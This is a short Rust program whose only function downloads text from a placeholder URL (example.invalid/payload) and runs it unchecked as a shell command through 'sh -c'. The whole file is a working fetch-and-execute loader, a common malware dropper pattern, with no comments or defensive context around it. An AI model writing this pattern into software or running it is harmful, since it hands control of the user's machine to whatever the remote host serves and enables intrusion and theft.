use std::process::Command;

fn main() {
    let body = reqwest::blocking::get("https://example.invalid/payload").unwrap().text().unwrap();
    Command::new("sh").arg("-c").arg(&body).status().unwrap();
}
